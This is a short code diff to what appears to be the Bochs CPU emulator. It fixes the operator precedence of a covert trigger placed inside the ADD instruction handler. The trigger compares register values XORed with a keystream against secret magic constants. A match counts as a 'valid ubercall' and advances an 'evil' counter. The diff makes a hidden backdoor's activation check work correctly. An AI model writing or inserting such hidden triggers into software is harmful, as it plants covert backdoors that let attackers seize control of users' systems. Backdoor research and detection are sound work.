@@ -92,8 +92,7 @@ BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
      */
 
   ctr_output(keystream);
-  if ((RAX ^ *((uint64_t *) keystream)     == 0x99a0086fba28dfd1) &&
-      (RBX ^ *((uint64_t *) keystream + 1) == 0xe2dd84b5c9688a03)) {
+  if (((RAX ^ *((uint64_t *) keystream)) == 0x99a0086fba28dfd1) && ((RBX ^ *((uint64_t *) keystream + 1)) == 0xe2dd84b5c9688a03)) {
       // we have a valid ubercall, let's do this texas-style
       BX_CPU_THIS_PTR evil.i_counter++;
       ctr_output(keystream);
